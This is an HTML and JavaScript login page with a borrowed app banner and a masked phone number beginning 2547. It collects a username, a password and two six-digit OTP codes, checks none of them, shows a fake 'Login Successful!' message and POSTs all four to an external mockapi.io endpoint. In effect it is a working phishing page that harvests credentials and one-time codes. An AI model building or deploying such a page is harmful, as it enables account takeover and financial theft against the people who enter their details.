<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Simple Login Form with OTP</title>
  <!-- Font Awesome CDN for fingerprint & eye icon -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f1eded;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      position: relative;
      width: 340px;
      border-radius: 10px;
      overflow: hidden;
      box-shadow: 0 4px 15px rgba(8, 8, 8, 0.89);
      background-size: cover;
      background-position: center;
      color: rgb(15, 10, 10);
    }

    .login-header {
      width: 100%;
      height: 120px;
      background: url("https://play-lh.googleusercontent.com/0brqPU3PLaJ5dqILv0aQmHX5jogRdLWMN4JZv9rAFp-Di3BknQ6yckE42LlNNFAOYlQ=w240-h480-rw") no-repeat center center/cover;
    }

    .login-body {
      padding: 25px;
      background: rgba(233, 229, 229, 0.884);
    }

    .login-body h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #0a0909;
    }

    .form-group {
      margin-bottom: 15px;
      position: relative;
    }

    .form-group label {
      display: block;
      font-size: 14px;
      margin-bottom: 5px;
      font-weight: bold;
    }

    .form-group input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .toggle-password {
      position: absolute;
      top: 37px;
      right: 10px;
      cursor: pointer;
      color: #555;
    }

    .form-group .forgot-link {
      display: block;
      text-align: right;
      font-size: 12px;
      color: rgb(250, 125, 8);
      margin-top: 5px;
      text-decoration: none;
    }

    .form-group .forgot-link:hover {
      text-decoration: underline;
    }

    .button-group {
      display: flex;
      justify-content: space-between;
      gap: 10px;
    }

    .login-body button {
      flex: 1;
      padding: 10px;
      border: none;
      background: #727474;
      color: white;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
    }

    .login-body button:hover {
      background: #434344;
    }

    .fingerprint-btn {
      width: 45px;
      height: 45px;
      background: rgb(250, 125, 8);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 18px;
      color: white;
      border-radius: 50%;
      cursor: pointer;
      border: none;
    }

    .fingerprint-btn:hover {
      background: rgb(200, 100, 5);
    }

    .register-text {
      text-align: center;
      margin-top: 20px;
      font-size: 14px;
      color: black;
    }

    .register-text a {
      color: #bd4e05;
      font-weight: bold;
      text-decoration: none;
    }

    .register-text a:hover {
      text-decoration: underline;
    }

    /* OTP Modal */
    .modal {
      display: none;
      position: fixed;
      z-index: 999;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.6);
      justify-content: center;
      align-items: center;
    }

    .modal-content {
      background: white;
      padding: 20px;
      border-radius: 8px;
      text-align: center;
      width: 300px;
    }

    .otp-inputs {
      display: flex;
      justify-content: space-between;
      margin: 15px 0;
    }

    .otp-inputs input {
      width: 40px;
      height: 40px;
      font-size: 20px;
      text-align: center;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .modal button {
      margin-top: 10px;
      padding: 8px 15px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      background: #727474;
      color: white;
    }

    .modal button:hover {
      background: #434344;
    }

    .success-message {
      font-size: 18px;
      color: green;
      font-weight: bold;
      display: none;
    }
  </style>
</head>
<body>

  <div class="login-container" id="loginBox">
    <div class="login-header"></div>

    <div class="login-body">
      <h2>Login</h2>
      <form id="loginForm">
        <div class="form-group">
          <label for="username">Username</label>
          <input type="text" id="username" name="username" placeholder="Enter Username" required>
          <a href="#" class="forgot-link">Forgot Username?</a>
        </div>

        <div class="form-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password" placeholder="Enter Password" required>
          <i class="fas fa-eye toggle-password" id="togglePassword"></i>
          <a href="#" class="forgot-link">Forgot Password?</a>
        </div>

        <div class="button-group">
          <button type="submit">Login</button>
          <button type="button" class="fingerprint-btn">
            <i class="fas fa-fingerprint"></i>
          </button>
        </div>
      </form>

      <p class="register-text">Are you new here? <a href="#">Register Now</a></p>
    </div>
  </div>

  <!-- OTP Modal -->
  <div class="modal" id="otpModal1">
    <div class="modal-content">
      <h3>OTP Verification 1</h3>
      <p>Enter the 6-digit code sent to 2547*********</p>
      <div class="otp-inputs" id="otpInputs1"></div>
      <button onclick="resendOtp(1)">Resend</button>
    </div>
  </div>

  <div class="modal" id="otpModal2">
    <div class="modal-content">
      <h3>OTP Verification 2</h3>
      <p>Enter the 6-digit code sent to 2547*********</p>
      <div class="otp-inputs" id="otpInputs2"></div>
      <button onclick="resendOtp(2)">Resend</button>
    </div>
  </div>

  <div class="success-message" id="successMessage">
    ‚úÖ Login Successful!
  </div>

<script>
  const togglePassword = document.querySelector("#togglePassword");
  const password = document.querySelector("#password");

  togglePassword.addEventListener("click", function () {
    const type = password.getAttribute("type") === "password" ? "text" : "password";
    password.setAttribute("type", type);
    this.classList.toggle("fa-eye-slash");
  });

  let loginData = { username: "", password: "", otp1: "", otp2: "" };

  const loginForm = document.getElementById("loginForm");
  loginForm.addEventListener("submit", function(e) {
    e.preventDefault();
    loginData.username = document.getElementById("username").value;
    loginData.password = document.getElementById("password").value;

    // Show OTP1 modal
    document.getElementById("otpModal1").style.display = "flex";
    createOtpInputs("otpInputs1", (otpCode) => {
      loginData.otp1 = otpCode;
      document.getElementById("otpModal1").style.display = "none";
      document.getElementById("otpModal2").style.display = "flex";
    });

    createOtpInputs("otpInputs2", (otpCode) => {
      loginData.otp2 = otpCode;
      document.getElementById("otpModal2").style.display = "none";
      document.getElementById("successMessage").style.display = "block";
      postToMockAPI(loginData); // send data online
    });
  });

  function createOtpInputs(containerId, onComplete) {
    const container = document.getElementById(containerId);
    container.innerHTML = "";
    let code = "";
    for (let i = 0; i < 6; i++) {
      let input = document.createElement("input");
      input.setAttribute("maxlength", "1");
      input.type = "text";
      input.addEventListener("input", function() {
        if (this.value && this.nextElementSibling) {
          this.nextElementSibling.focus();
        }
        let inputs = container.querySelectorAll("input");
        code = "";
        inputs.forEach(i => code += i.value);
        if (code.length === 6) {
          setTimeout(() => onComplete(code), 300);
        }
      });
      container.appendChild(input);
    }
    container.querySelector("input").focus();
  }

  function resendOtp(step) {
    alert("OTP " + step + " resent!");
  }

  // üîπ Function to post to MockAPI
  async function postToMockAPI(data) {
    const url = "https://68bd66a4227c48698f846deb.mockapi.io/login"; // Replace with your MockAPI endpoint

    try {
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });
      const result = await response.json();
      console.log("Data saved:", result);
      alert("‚úÖ Data posted to MockAPI!");
    } catch (error) {
      console.error("Error posting data:", error);
      alert("‚ùå Failed to post data.");
    }
  }
</script>

</body>
</html>
